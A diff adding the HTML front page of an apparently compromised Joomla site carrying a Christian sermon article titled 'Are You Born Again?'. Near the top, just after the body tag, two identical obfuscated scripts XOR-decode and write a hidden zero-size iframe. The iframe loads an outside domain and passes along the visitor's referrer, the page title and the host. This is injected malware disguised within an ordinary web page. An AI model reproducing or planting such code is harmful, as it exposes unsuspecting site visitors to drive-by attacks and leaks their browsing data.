@@ -1,0 +1,479 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" >
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="joomla, Joomla" />
+  <meta name="description" content="Joomla! - the dynamic portal engine and content management system" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Welcome to the Frontpage</title>
+  <link href="/lareformation.info/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/lareformation.info/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/lareformation.info/templates/rhuk_milkyway/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <script type="text/javascript" src="/lareformation.info/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/lareformation.info/media/system/js/caption.js"></script>
+
+
+<link rel="stylesheet" href="/lareformation.info/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/lareformation.info/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="/lareformation.info/templates/rhuk_milkyway/css/template.css" type="text/css" />
+<link rel="stylesheet" href="/lareformation.info/templates/rhuk_milkyway/css/blue.css" type="text/css" />
+<link rel="stylesheet" href="/lareformation.info/templates/rhuk_milkyway/css/blue_bg.css" type="text/css" />
+<!--[if lte IE 6]>
+<link href="/lareformation.info/templates/rhuk_milkyway/css/ieonly.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+
+</head>
+<body id="page_bg" class="color_blue bg_blue width_fmax">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<a name="up" id="up"></a>
+<div class="center" align="center">
+	<div id="wrapper">
+		<div id="wrapper_r">
+			<div id="header">
+				<div id="header_l">
+					<div id="header_r">
+						<div id="logo"></div>
+						
+
+
+<table class="contentpaneopen">
+	<tr>
+		<td valign="top" ><p><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">
+<p><em>Are You Born Again ?<br /><br />Start living in Victory in the only name of Jesus, by the meditation of the Living Word and by the leading of the Holy Spirit !<br /><br /><br />Receive also the gift of the Eternal life from GOD, and you will never be the same person !</em></p>
+</span></span></span></p></td>
+	</tr>
+	<tr>
+        <td valign="top" >
+
+       		</td>
+     </tr>
+</table>
+
+					</div>
+				</div>
+			</div>
+
+			<div id="tabarea">
+				<div id="tabarea_l">
+					<div id="tabarea_r">
+						<div id="tabmenu">
+						<table cellpadding="0" cellspacing="0" class="pill">
+							<tr>
+								<td class="pill_l">&nbsp;</td>
+								<td class="pill_m">
+								<div id="pillmenu">
+									
+								</div>
+								</td>
+								<td class="pill_r">&nbsp;</td>
+							</tr>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div id="search">
+				<form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Search" class="inputbox" type="text" size="20" value="search..."  onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="1" />
+</form>
+			</div>
+
+			<div id="pathway">
+				<span class="breadcrumbs pathway">
+Home</span>
+
+			</div>
+
+			<div class="clr"></div>
+
+			<div id="whitebox">
+				<div id="whitebox_t">
+					<div id="whitebox_tl">
+						<div id="whitebox_tr"></div>
+					</div>
+				</div>
+
+				<div id="whitebox_m">
+					<div id="area">
+									
+
+						<div id="leftcolumn">
+															<div class="module_menu">
+			<div>
+				<div>
+					<div>
+													<h3>Main Menu</h3>
+											<ul class="menu"><li id="current" class="active item1"><a href="http://thesiteforyou.info/lareformation.info/"><span>Home</span></a></li></ul>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Login Form</h3>
+											<form action="/lareformation.info/index.php" method="post" name="login" id="form-login" >
+		<fieldset class="input">
+	<p id="form-login-username">
+		<label for="modlgn_username">Username</label><br />
+		<input id="modlgn_username" type="text" name="username" class="inputbox" alt="username" size="18" />
+	</p>
+	<p id="form-login-password">
+		<label for="modlgn_passwd">Password</label><br />
+		<input id="modlgn_passwd" type="password" name="passwd" class="inputbox" size="18" alt="password" />
+	</p>
+		<p id="form-login-remember">
+		<label for="modlgn_remember">Remember Me</label>
+		<input id="modlgn_remember" type="checkbox" name="remember" class="inputbox" value="yes" alt="Remember Me" />
+	</p>
+		<input type="submit" name="Submit" class="button" value="Login" />
+	</fieldset>
+	<ul>
+		<li>
+			<a href="/lareformation.info/index.php?option=com_user&amp;view=reset">
+			Forgot your password?</a>
+		</li>
+		<li>
+			<a href="/lareformation.info/index.php?option=com_user&amp;view=remind">
+			Forgot your username?</a>
+		</li>
+				<li>
+			<a href="/lareformation.info/index.php?option=com_user&amp;view=register">
+				Create an account</a>
+		</li>
+			</ul>
+	
+	<input type="hidden" name="option" value="com_user" />
+	<input type="hidden" name="task" value="login" />
+	<input type="hidden" name="return" value="L2xhcmVmb3JtYXRpb24uaW5mby9pbmRleC5waHA=" />
+	<input type="hidden" name="b49eabcf471f8183dd7861e46683737b" value="1" /></form>
+					</div>
+				</div>
+			</div>
+		</div>
+	
+												</div>
+
+												<div id="maincolumn">
+																					<table class="nopad user1user2">
+									<tr valign="top">
+																					<td>
+														<div class="moduletable">
+					<h3>Latest News</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=83:the-fundamentals-principles&amp;catid=1:latest-news" class="latestnews">
+			The Fundamentals Principles</a>
+	</li>
+	<li class="latestnews">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=82:dieu-ta-tant-aime-quil-ta-envoye-son-fils-jesus-&amp;catid=1:latest-news" class="latestnews">
+			Dieu t'a tant aimé qu'Il t'a envoyé son Fils Jésus !</a>
+	</li>
+	<li class="latestnews">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=80:principle-number-1-for-blessing-read-the-bible&amp;catid=1:latest-news" class="latestnews">
+			Principle Number 1 : Read the Bible</a>
+	</li>
+	<li class="latestnews">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=79:happy-new-year-&amp;catid=3:newsflash" class="latestnews">
+			Are You Born Again ?</a>
+	</li>
+	<li class="latestnews">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=77:merry-christmas-&amp;catid=1:latest-news" class="latestnews">
+			Merry Christmas !</a>
+	</li>
+</ul>		</div>
+	
+											</td>
+																															<td class="greyline">&nbsp;</td>
+																															<td>
+														<div class="moduletable">
+					<h3>Popular</h3>
+					<ul class="mostread">
+	<li class="mostread">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=64:la-priere-de-la-foi&amp;catid=1:latest-news" class="mostread">
+			La Prière de la Foi</a>
+	</li>
+	<li class="mostread">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=49:la-foi-lesperance-et-lamour-les-cles-du-paradis&amp;catid=1:latest-news" class="mostread">
+			La FOI, l'ESPERANCE et l'AMOUR, les cles du Paradis</a>
+	</li>
+	<li class="mostread">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=60:comment-connaitre-la-volonte-de-dieu-pour-votre-vie-&amp;catid=1:latest-news" class="mostread">
+			Comment connaitre la volonté de Dieu pour votre Vie ?</a>
+	</li>
+	<li class="mostread">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=62:la-justification-par-la-foi&amp;catid=1:latest-news" class="mostread">
+			La Justification par la Foi</a>
+	</li>
+	<li class="mostread">
+		<a href="/lareformation.info/index.php?option=com_content&amp;view=article&amp;id=77:merry-christmas-&amp;catid=1:latest-news" class="mostread">
+			Merry Christmas !</a>
+	</li>
+</ul>		</div>
+	
+											</td>
+																			</tr>
+								</table>
+
+								<div id="maindivider"></div>
+							
+							<table class="nopad">
+								<tr valign="top">
+									<td>
+										<div class="componentheading">
+	Welcome to the Frontpage</div>
+<table class="blog" cellpadding="0" cellspacing="0">
+<tr>
+	<td valign="top">
+					<div>
+		
+<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					The New Creation or ''The New Being Born''			</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/lareformation.info/index.php?view=article&amp;catid=1:latest-news&amp;id=70:the-new-creation&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/lareformation.info/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/lareformation.info/index.php?view=article&amp;catid=1:latest-news&amp;id=70:the-new-creation&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Print" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/lareformation.info/images/M_images/printButton.png" alt="Print"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/lareformation.info/index.php?option=com_mailto&amp;tmpl=component&amp;link=065fdeba2499ce198ae0b642d34c1fdca77d7b6c" title="E-mail" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/lareformation.info/images/M_images/emailButton.png" alt="E-mail"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+<tr>
+	<td width="70%"  valign="top" colspan="2">
+		<span class="small">
+			Written by Adama		</span>
+		&nbsp;&nbsp;
+	</td>
+</tr>
+
+<tr>
+	<td valign="top" colspan="2" class="createdate">
+		Thursday, 16 September 2010 13:58	</td>
+</tr>
+
+
+<tr>
+<td valign="top" colspan="2">
+<p class="MsoNormal"><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-size: small;"><span style="font-family: Calibri;"><span style="color: #000000;">                                                  <strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">ARE YOU BORN AGAIN ?</span></strong></span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri;"><span style="color: #000000;"><br /></span></span></span></p>
+<p><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">
+<p class="MsoNormal" style="text-align: justify;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">That's a bit out of the question.You can go to Church <span style="line-height: 115%; font-family: ">for</span> a long time, you can even be a Bible teacher, but if you are not born again you can never be a <strong>New Creation</strong>. You are still an Old Creation. So, that’s very important to understand clearly what’s <strong>‘’To be born again’’</strong> and what was Jesus meaning when He said: ‘’ <em>you must be born again</em> ’’. The new being born is a spiritual being born. It’s a birth as well as the physical birth. The first being born is from human being. The second being born is from GOD .So that, you can not become GOD’s child by becoming a member in a Church. As a monkey can not become a human being by joining the human race. It can dress as a human and act as a human, but it remains a monkey.The New Creation is not the fact of going to Church nor having a christian name, but it's a new life, it's a lifestyle.The only way to become a GOD’s child  and have that lifestyle is to be born again.</span></span></span></p>
+</span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;">
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri;"><span style="color: #000000;">What’s to be born again?</span></span></span></p>
+<p class="MsoListParagraphCxSpFirst" style="text-align: justify; text-indent: -18pt; margin: 0cm 0cm 0pt 36pt; mso-list: l0 level1 lfo1;"><span style="color: #000000;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US; mso-bidi-font-family: Calibri;" lang="EN-US"><span style="mso-list: Ignore;"><span style="font-family: Calibri;">1)</span><span style="font: 7pt ">      </span></span></span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri;">That’s a new life (<strong>2Corinthians 5:17</strong>)</span></span></span></p>
+<p class="MsoListParagraphCxSpMiddle" style="text-align: justify; text-indent: -18pt; margin: 0cm 0cm 0pt 36pt; mso-list: l0 level1 lfo1;"><span style="color: #000000;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US; mso-bidi-font-family: Calibri;" lang="EN-US"><span style="mso-list: Ignore;"><span style="font-family: Calibri;">2)</span><span style="font: 7pt ">      </span></span></span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri;">That’s a spiritual resurrection (<strong>Ephesians 2:1-9</strong>)</span></span></span></p>
+<p class="MsoListParagraphCxSpLast" style="text-align: justify; text-indent: -18pt; margin: 0cm 0cm 10pt 36pt; mso-list: l0 level1 lfo1;"><span style="color: #000000;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US; mso-bidi-font-family: Calibri;" lang="EN-US"><span style="mso-list: Ignore;"><span style="font-family: Calibri;">3)</span><span style="font: 7pt ">      </span></span></span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri;">That’s a new regeneration (<strong>Tite 3:5</strong>). It’s also, as we will note in that meditation, to participate in divine nature by accepting Jesus-Christ as our Savior. It’s also to be justified by GOD (Justification by Faith. <strong>Romans 3:22-24</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000;"> </span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">I. Jesus and the two births. John 3:1-8</span></span></span></strong></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">In our text we can see Jesus, the Son of GOD before a religious man, but who doesn’t know the salvation from GOD way. It’s clear according to the passage that to believe that ‘’GOD is’’ or to practice religion can never make a human’s child to GOD’s child. Nicodemus had not needed a teacher; He was in need of a Savior. He was in need of something better than religion; he was in need of regeneration. He was in need of something better than the Law, he was in need of life. The Law is good to understand holiness and to show sin (<strong>Romans 3:19-20; 7:16-17</strong>), but to have Christ is excellent (<strong>Philippians 3:8-9</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">Jesus has been direct when He said: ’’ <em>You must be born again</em> ’’. When Nicodemus ask: ’’How can man be born again when he is old?’’, Jesus shows that is about two types of births: ’’ <em>What is born from flesh is flesh and what is born from Spirit is Spirit</em> ’’</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 0pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">To be born from flesh</span></em><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-size: small;">:</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 0pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">a</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces a human nature, sinful from the beginning because the human race was multiplied after sin came in the heart of human. That nature is both corrupt and corruptible ( <strong>Psalms 51:5-7</strong>; <strong>1 Corinthians 15:42-44</strong>).</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 0pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">b</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces a corruptible nature and condemned by GOD (<strong>John 3:6, 18, 36</strong>; <strong>Romans 3:10-12, 23; 6:23</strong>).</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 0pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">c</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces a nature that does every unbeliever an easy prey for the devil. (<strong>John 8:44</strong>).</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000;"> </span></span></em></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="color: #000000;"><span style="font-family: Calibri;"><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">The New being born</span></em><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-size: small;">:</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">a</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces an incorruptible nature (<strong>Romans 7:20</strong>; <strong>1Peter1:23, 24</strong>)</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">b</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces a just nature (<strong>2Corinthians 5:21</strong>; <strong>1Corinthians1:30</strong>)</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">c</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">It produces a divine nature (<strong>2Peter 1:4</strong>)</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">Whoever is born again has in reality two natures, the old nature from physical birth and the new one from spiritual birth or the New born. By the first born we are from flesh, and by the second one, we are from GOD. <strong>Romans 8:9-11</strong></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm -11.35pt 0pt 0cm;"><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000; font-size: small;"> </span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">II. The way of the New being born. John3:14-18</span></span></span></strong></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">a</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><em>A comparison</em></span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">The LORD is using a history that has been lived by the people o Israel to illustrate what must arrive. As the Snake Made of Bronze of Moses must be put on a pole, Jesus-Christ must be hanging from a cross. What Moses did was for a sinful and disobeyed population. When somebody was bite by a snake, he was in choice: to humble and by faith, to look at the snake made of bronze and to live. If not, he dies from sin. (<strong>John 8:24</strong>).’’ For the same, the Son of GOD must be raised. As the snake made of bronze was the only way for healing of people in Israel, the death of Jesus is also the only was to be born again. The one way to have regeneration’s power from GOD is to believe in the death and the resurrection of Jesus-Christ by faith. (<strong>1 Corinthians 15:1-4</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">b</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">The sinner must come to Christ by believing</span></em></span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">:</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">1) That the Son of GOD is died for our sins according to the Scriptures (<strong>Es.53:4-6</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">2) That He has been buried (That’s the proof He’s died).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">3) That He raised three day later according to the Scriptures. (<strong>Es.53:10; Ps.116:1</strong>)</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">The Gospel saves, but it has no power to save except for the sinner to accept Jesus-Christ as his savior by a sincere faith. ( <strong>John 1:12</strong>; <strong>Romans 1:16</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">c</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">The part of GOD</span></em></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">1) Father’s love (<strong>John 3:16</strong>). By love for the humans, GOD supplies the human with the one way to redeem him without compromising His Justice and His Holiness. GOD hates the sin, He’s Holy. To save the humans being, GOD has been in need of a substitution. This must be without sin. So, GOD sent His own Son in a similar body like the ours (a kind of way to come Himself). Which has been sacrificed for the sinners? GOD proves His love towards the humans by doing that. Because of that the New Creation has been possible.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">2) Jesus came voluntarily in GOD’s love, and He is really the only way of the New Creation (<strong>Acts 4:10-12</strong>; <strong>John 17:1-5</strong>; <strong>Romans 5:8</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">3) The Holy Spirit is in the world to persuade the sinners and to live in the heart of the Believer (<strong>John 16:7-14</strong>). An own appropriation by faith in the death, the burying and the rise of Jesus-Christ is still the only means to be born again.</span></span></span></p>
